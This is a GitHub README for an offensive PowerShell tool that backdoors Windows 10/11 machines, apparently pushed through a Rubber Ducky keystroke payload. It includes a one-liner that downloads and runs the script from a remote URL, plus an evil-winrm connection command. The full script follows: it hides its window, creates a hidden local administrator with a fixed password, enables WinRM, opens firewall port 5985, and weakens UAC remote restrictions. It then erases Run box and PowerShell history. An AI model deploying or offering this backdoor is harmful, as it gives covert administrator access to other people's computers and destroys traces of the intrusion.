# WinRM-Reverse-Shell
+ Works on Windows 10/11

# Own Pass And Name
Go to `WinRM.ps1` and edit 
+ $Username = "`TO YOUR OWN`"
And for the pass edit
+ $Password = ConvertTo-SecureString "`TO YOUR OWN`" -AsPlainText -Force

# Powershell One liner with administrator permissions
`IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")`
# How to get the shell using Evil-WinRM
Use this command 
`evil-winrm -i YOUR.IP.ADDRES.LOL -u Admin -p Password1`
# ![Screenshot_2024-02-25_13-40-13 (1)](https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/446782ec-8fcf-46ac-adf1-10f54711bf73)

# Rubber Ducky payload
### The payload is in this repo aswel 
+ Edit your own speed of the payload
+ You can change to URL to your own 



https://github.com/VBV11/WinRM-Reverse-Shell/assets/104235290/fa37438d-69cc-4969-8866-dc02a3437dec



# Script into pieces
## Function to hide a window
function Hide-Window {
    param(
        [IntPtr]$Handle = (Get-Process -PID $PID).MainWindowHandle
    )
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Window {
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
    }
"@
    [void][Window]::ShowWindow($Handle, 0)
}

## Hide the current PowerShell window
Hide-Window

## Create a new local user account
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

## Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

## Enable Windows Remote Management (WinRM)
Enable-PSRemoting -Force

## Add a firewall rule to allow WinRM traffic
New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow

## Disable UAC remote restrictions
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force

## Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

## Delete powershell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

## Exit PowerShell session
Exit

# Credits
### credits TW-D for inspiring me to create this powershell script
